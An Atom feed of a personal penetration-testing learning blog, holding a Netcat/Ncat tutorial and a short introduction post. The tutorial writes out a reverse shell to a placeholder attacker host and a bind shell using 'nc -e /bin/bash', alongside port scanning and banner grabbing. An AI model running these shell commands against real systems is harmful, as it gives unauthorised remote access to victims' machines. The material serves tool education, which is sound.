<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://nighty-sky.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://nighty-sky.github.io/blog/" rel="alternate" type="text/html" /><updated>2025-08-25T10:40:17+05:30</updated><id>https://nighty-sky.github.io/blog/feed.xml</id><title type="html">Night’s Blog</title><subtitle>Learning &amp; documenting my journey into penetration testing.</subtitle><author><name>Nighty</name></author><entry><title type="html">Netcat</title><link href="https://nighty-sky.github.io/blog/pentesting/tools/2025/08/23/netcat.html" rel="alternate" type="text/html" title="Netcat" /><published>2025-08-23T00:00:00+05:30</published><updated>2025-08-23T00:00:00+05:30</updated><id>https://nighty-sky.github.io/blog/pentesting/tools/2025/08/23/netcat</id><content type="html" xml:base="https://nighty-sky.github.io/blog/pentesting/tools/2025/08/23/netcat.html"><![CDATA[<h1 id="intro-to-netcat">Intro to Netcat</h1>

<p>When it comes to networking and pentesting, <strong>Netcat</strong> (often shortened to <code class="language-plaintext highlighter-rouge">nc</code>) is known as the <em>Swiss Army Knife of networking</em>. It can read and write data across TCP and UDP connections, making it useful for everything from banner grabbing to file transfers, from simple debugging to creating backdoors.</p>

<p>I’m writing this post because <strong>Ncat/Netcat is an important tool</strong>, but I found that while platforms like <em>TryHackMe</em> have some great resources, other blogs are often incomplete, outdated, or outright incorrect. This post aims to bring everything together in one place — both the traditional <code class="language-plaintext highlighter-rouge">nc</code> and the modern <code class="language-plaintext highlighter-rouge">ncat</code> — with detailed explanations.</p>

<hr />

<h2 id="what-is-netcat">What is Netcat?</h2>

<p>Netcat is a command-line networking tool that can:</p>

<ul>
  <li>Connect to remote hosts and ports (client mode).</li>
  <li>Listen for incoming connections (server mode).</li>
  <li>Transfer files.</li>
  <li>Set up simple chat sessions.</li>
  <li>Provide remote shells (with the <code class="language-plaintext highlighter-rouge">-e</code> option in older builds).</li>
</ul>

<p>Because of its flexibility, it’s often referred to as a <strong>Swiss Army Knife for networking tasks</strong>.</p>

<p>See the posts in repo,for .md file
www.github.com/Nighty-Sky/blog/
for cheat-sheet.</p>

<hr />

<h2 id="netcat-variants">Netcat Variants</h2>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">nc.traditional</code></strong> → The original version, still available on some Linux distributions. Supports the infamous <code class="language-plaintext highlighter-rouge">-e</code> option.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">netcat-openbsd</code></strong> → A safer reimplementation; it removes the dangerous <code class="language-plaintext highlighter-rouge">-e</code> feature by default.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">ncat</code></strong> → A modern reimplementation, maintained by the <a href="https://nmap.org/ncat/">Nmap Project</a>. Supports SSL, proxies, connection brokering, and access control.</li>
</ul>

<hr />

<h2 id="nctraditional-help-output"><code class="language-plaintext highlighter-rouge">nc.traditional</code> Help Output</h2>

<p>Running <code class="language-plaintext highlighter-rouge">nc.traditional -h</code> shows:</p>

<p>connect to somewhere:   nc [-options] hostname port[s] [ports] … listen for inbound:     nc -l -p port [-options] [hostname] [port] options: -c shell commands   as `-e’; use /bin/sh to exec [dangerous!!] -e filename         program to exec after connect [dangerous!!] -b                  allow broadcasts -g gateway          source-routing hop point[s], up to 8 -G num              source-routing pointer: 4, 8, 12, … -h                  this cruft -i secs             delay interval for lines sent, ports scanned -k                  set keepalive option on socket -l                  listen mode, for inbound connects -n                  numeric-only IP addresses, no DNS -o file             hex dump of traffic -p port             local port number -r                  randomize local and remote ports -q secs             quit after EOF on stdin and delay of secs -s addr             local source address -T tos              set Type Of Service -t                  answer TELNET negotiation -u                  UDP mode -v                  verbose [use twice to be more verbose] -w secs             timeout for connects and final net reads -C                  Send CRLF as line-ending -z                  zero-I/O mode [used for scanning]</p>

<hr />

<h2 id="key-options-explained">Key Options Explained</h2>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">-l</code></strong> → Listen mode, to accept incoming connections.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-p</code></strong> → Specify the local port.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-v</code></strong> → Verbose output (use twice for extra details).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-n</code></strong> → Skip DNS lookups (numeric IPs only).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-u</code></strong> → UDP mode instead of TCP.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-w</code></strong> → Timeout for connects and reads.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-z</code></strong> → Zero-I/O mode, useful for port scanning.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-e</code> / <code class="language-plaintext highlighter-rouge">-c</code></strong> → Execute a program after connection (<em>dangerous; removed in OpenBSD’s version</em>).</li>
</ul>

<hr />

<h2 id="common-use-cases">Common Use Cases</h2>

<h3 id="1-simple-tcp-client">1. Simple TCP Client</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc example.com 80
</code></pre></div></div>
<p>Connects to port 80 (HTTP) and allows you to type raw requests manually.</p>

<hr />

<ol>
  <li>Banner Grabbing
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-v</span> target.com 21
</code></pre></div>    </div>
    <p>Attempts a connection to FTP (port 21) and often reveals service banners (useful for identifying services and versions).</p>
  </li>
</ol>

<hr />

<ol>
  <li>File Transfer</li>
</ol>

<p>On the receiver machine:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 8888 <span class="o">&gt;</span> file.txt
</code></pre></div></div>
<p>On the sender machine:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc target_ip 8888 &lt; file.txt
</code></pre></div></div>
<p>Quick file transfer without FTP/SSH.</p>

<hr />

<ol>
  <li>Reverse Shell</li>
</ol>

<p>Attacker (listening):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
</code></pre></div></div>
<p>Victim:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc attacker_ip 4444 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>
<p>Gives the attacker a shell when the victim connects back.</p>

<hr />

<ol>
  <li>Bind Shell</li>
</ol>

<p>Victim (listening):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>
<p>Attacker:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc victim_ip 4444
</code></pre></div></div>
<hr />

<p>Reverse Shell vs Bind Shell (Quick Diagram)</p>

<p>Bind Shell → Victim opens a port, attacker connects in.</p>

<p>[Attacker] –&gt; Connects –&gt; [Victim Listening]</p>

<p>Reverse Shell → Victim connects back to attacker’s listener.</p>

<p>[Victim] –&gt; Connects –&gt; [Attacker Listening]</p>

<hr />
<ol>
  <li>Port Scanning</li>
</ol>

<p>Although Nmap is the industry standard for port scanning, Netcat can also be used for basic scans. With the -z (zero-I/O) option, Netcat will attempt to connect to ports without sending any data, making it useful for a quick check of open ports. Combine this with -v (verbose) to see which ports respond.</p>

<p>Example – Scan a range of ports:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-zv</span> target.com 20-1000
</code></pre></div></div>
<p>-z → Zero-I/O mode (just checks if port is open).</p>

<p>-v → Verbose mode (tells you what’s happening).</p>

<p>20-1000 → Port range to scan.</p>

<p>Output will look something like:</p>

<p>Connection to target.com 22 port [tcp/ssh] succeeded!
Connection to target.com 80 port [tcp/http] succeeded!</p>

<p>This quickly shows open ports, but remember — it’s slower and less feature-rich than Nmap. Still, it’s handy when Nmap isn’t available.</p>

<hr />

<p>What About Ncat?</p>

<p>While Netcat remains widely used, Ncat (from the Nmap project) adds features like:</p>

<p>SSL/TLS support → Encrypted communication.</p>

<p>Proxy support → Works with SOCKS4, SOCKS5, or HTTP proxies.</p>

<p>Connection brokering → Multiple clients can share data.</p>

<p>Access control → Use –allow / –deny to restrict connections.</p>

<p>Chat mode → Built-in multi-user chat.</p>

<p>Example (SSL connection):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat <span class="nt">--ssl</span> example.com 443
</code></pre></div></div>

<hr />

<p>Security Considerations</p>

<p>Using -e to spawn shells is extremely risky — many modern builds disable it.</p>

<p>Always restrict listening ports with firewalls when running in server mode.</p>

<p>Remember: tools like Netcat are double-edged swords — invaluable for sysadmins and pentesters, but also abused by attackers.</p>

<p>✅ In summary: Netcat (and Ncat) are must-know tools for anyone learning pentesting or networking. They’re simple, lightweight, and extremely powerful when combined with other techniques.</p>

<hr />]]></content><author><name>Nighty</name></author><category term="pentesting" /><category term="tools" /><category term="netcat" /><category term="cheat-sheet" /><category term="ncat" /><category term="scanning" /><category term="networking" /><summary type="html"><![CDATA[Intro to Netcat]]></summary></entry><entry><title type="html">Introduction</title><link href="https://nighty-sky.github.io/blog/pentesting/2025/08/20/Introduction.html" rel="alternate" type="text/html" title="Introduction" /><published>2025-08-20T00:00:00+05:30</published><updated>2025-08-20T00:00:00+05:30</updated><id>https://nighty-sky.github.io/blog/pentesting/2025/08/20/Introduction</id><content type="html" xml:base="https://nighty-sky.github.io/blog/pentesting/2025/08/20/Introduction.html"><![CDATA[<h1 id="welcome-to-nights-pentesting-blog">Welcome to Night’s Pentesting Blog</h1>

<p>I was — and still am — into development: <strong>Android, backend, and web front-end</strong> in that order of priority.<br />
But even with all that knowledge, I began to feel something was missing.</p>

<p>I’m not just another person who wants to learn pentesting (ethical hacking) to “feel cool.”<br />
I’m <strong>determined</strong>. I like to talk , so I made this blog.<br />
What a rhyming start, right?</p>

<p>Keeping my privacy intact, you can simply call me <strong>Night</strong>. 🌙</p>

<hr />

<h2 id="-contact-me">📬 Contact Me</h2>

<section class="text-center">  
  <!-- Google -->
  <a class="btn btn-link btn-floating btn-lg text-body m-1" href="mailto:demo42823@gmail.com" role="button">
    <i class="fab fa-google"></i>
  </a>

  <!-- Medium -->
  <a class="btn btn-link btn-floating btn-lg text-body m-1" href="https://medium.com/@demo42823" role="button">
    <i class="fab fa-medium"></i>
  </a>

  <!-- LinkedIn -->
  <a class="btn btn-link btn-floating btn-lg text-body m-1" href="https://www.linkedin.com/in/nighty-sky-12699837a" role="button">
    <i class="fab fa-linkedin"></i>
  </a>

  <!-- GitHub -->
  <a class="btn btn-link btn-floating btn-lg text-body m-1" href="https://www.github.com/Nighty-Sky" role="button">
    <i class="fab fa-github"></i>
  </a>
</section>

<!-- MDB JS (ES Module) -->
<script type="module">
  import { Ripple, initMDB } from "https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/7.1.0/mdb.es.min.js";
  initMDB({ Ripple });  // activate ripple globally
</script>

<hr />

<h2 id="-upcoming">🔮 Upcoming</h2>

<p>I’ll share my <strong>roadmap</strong> in pentesting and take you along on this journey.<br />
Expect practical notes, tools, and real-world learning experiences.</p>

<p>Stay tuned — the journey has just begun.</p>

<p>— <strong>Nighty</strong></p>]]></content><author><name>Nighty</name></author><category term="pentesting" /><category term="intro" /><category term="pentesting" /><category term="ethical hacking" /><summary type="html"><![CDATA[Welcome to Night’s Pentesting Blog]]></summary></entry></feed>